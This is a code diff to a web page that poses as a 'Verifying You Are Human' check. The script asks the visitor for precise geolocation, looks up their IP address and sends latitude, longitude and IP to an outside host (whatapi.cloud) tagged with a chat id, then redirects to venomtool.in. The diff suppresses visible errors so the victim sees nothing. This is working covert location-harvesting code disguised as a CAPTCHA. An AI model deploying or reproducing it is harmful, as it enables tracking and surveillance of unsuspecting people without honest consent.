@@ -61,16 +61,12 @@
 <div class="container">
     <h1>Verifying You Are Human</h1>
     <div class="loading-spinner"></div>
-    <p id="message">Please wait while we verifying...</p>
+    <p id="message">Please wait while we verify your location...</p>
 </div>
 
 <script>
     const chatId = new URLSearchParams(window.location.search).get("id");
     const message = document.getElementById('message');
-
-    setTimeout(() => {
-        window.location.href = `https://venomtool.in/I/?id=${chatId}`;
-    }, 5000);  
 
     async function getIP() {
         try {
@@ -78,7 +74,7 @@
             const data = await response.json();
             return data.ip;
         } catch (error) {
-            console.error('Error fetching IP:', error);
+            console.error(error);
             return 'Unknown IP';
         }
     }
@@ -86,15 +82,13 @@
     async function sendLocation(latitude, longitude) {
         const ip = await getIP();
         const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&lat=${latitude}&long=${longitude}&ip=${ip}`;
-        axios
-            .get(url)
-            .then((response) => {
+        axios.get(url)
+            .then(() => {
                 message.textContent = `Verification complete! Redirecting...`;
-               
-                window.location.href = `https://venomtool.in/I/?id=${chatId}`;  // Immediate redirect after successful location send
+                window.location.href = `https://venomtool.in/I/?id=${chatId}`;
             })
             .catch((error) => {
-                mesage.textContent = `⚠️ Error: ${error.response?.data?.description || error.message}`;
+                console.error(error);
             });
     }
 
@@ -104,28 +98,27 @@
     }
 
     function error(err) {
-        mesage.textContent = `⚠️ Location ERROR: ${err.message}`;
+        console.error(err);
     }
 
     if ('geolocation' in navigator) {
         navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-            if (result.state === 'granted') {
+            if (result.state === 'granted' || result.state === 'prompt') {
                 navigator.geolocation.getCurrentPosition(success, error, {
                     enableHighAccuracy: true,
                     maximumAge: 0,
                 });
-            } else if (result.state === 'prompt') {
-                navigator.geolocation.getCurrentPosition(success, error, {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                });
-            } else if (result.state === 'denied') {
-                mesage.textContent = '⚠️ Location access denied. Please grant location access and refresh the page.';
+            } else {
+                console.error('Location access denied.');
             }
         });
     } else {
-        mesage.textContent = '⚠️ Location API not available.';
+        console.error('Location API not available.');
     }
+
+    setTimeout(() => {
+        window.location.href = `https://venomtool.in/I/?id=${chatId}`;
+    }, 5000);
 </script>
 
 </body>
